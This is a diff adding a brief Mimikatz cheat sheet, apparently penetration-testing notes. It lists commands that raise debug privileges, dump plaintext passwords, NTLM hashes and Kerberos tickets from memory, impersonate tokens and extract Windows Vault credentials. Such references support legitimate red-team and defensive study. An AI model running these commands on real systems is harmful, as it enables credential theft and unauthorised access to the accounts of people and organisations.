@@ -1,0 +1,20 @@
+==============================
+Mimikatz (mimikTZ)
+==============================
+
+privilege::debug                  # Enables debug privileges (required for most actions)
+log mimikatz.log                  # Starts logging output to mimikatz.log
+sekurlsa::logonpasswords          # Dumps credentials from memory: plaintext, NTLM, Kerberos tickets
+sekurlsa::msv                     # Dumps MSV credentials (cached logins)
+sekurlsa::wdigest                 # Dumps WDigest credentials (plaintext if enabled)
+sekurlsa::kerberos                # Dumps Kerberos tickets and keys
+sekurlsa::ssp                     # Dumps Security Support Provider credentials
+sekurlsa::tspkg                   # Dumps TSPKG credentials (legacy)
+sekurlsa::livessp                 # Dumps LiveSSP credentials (if any)
+sekurlsa::logonpasswords full     # Dumps with extended details
+token::list                       # Lists available tokens
+token::elevate                    # Impersonates a selected token
+vault::list                       # Lists credentials stored in Windows Vault
+vault::cred                       # Extracts credentials from Windows Vault
+
+exit                              # Exits Mimikatz
